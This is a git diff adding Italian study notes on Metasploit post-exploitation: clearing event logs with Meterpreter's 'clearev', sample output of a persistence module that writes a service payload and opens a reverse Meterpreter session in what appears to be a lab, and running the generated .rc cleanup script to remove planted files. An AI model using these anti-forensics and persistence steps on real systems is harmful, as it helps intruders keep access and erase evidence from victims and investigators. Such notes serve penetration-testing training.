@@ -12,3 +12,23 @@ per poter eliminare gli event log su meterpreter
 ```bash
 clearev
 ```
+
+---
+### Usare gli script automatici
+quando per esempio usiamo un modulo di persistenza, esso caricherá tati file dentro il sistema target. <br> 
+dopo la sua esecuzione, generalmente, viene generato uno script automatico di petasploit per poter automatizzare la rimozione delle tracce:
+```bash
+# avremo un output del genere
+[*] Started reverse TCP handler on IP:PORT 
+[*] Running module against ATTACKDEFENSE
+[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\cZjWgLB.exe                                      # questo é il payload
+[*] Creating service dxfcJWAI
+[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20250719.4239/ATTACKDEFENSE_20250719.4239.rc     # questo é il file di pulizia 
+[*] Sending stage (176198 bytes) to IP
+[*] Meterpreter session 2 opened (IP:PORT -> IPK:PORTK)
+```
+e da dentro meterpreter, possiamo usare il commando: 
+```bash
+resource /path/del/file/di/pulizia.rc
+```
+per poter automatizzare la rimozione dei file inseriti sul target. 
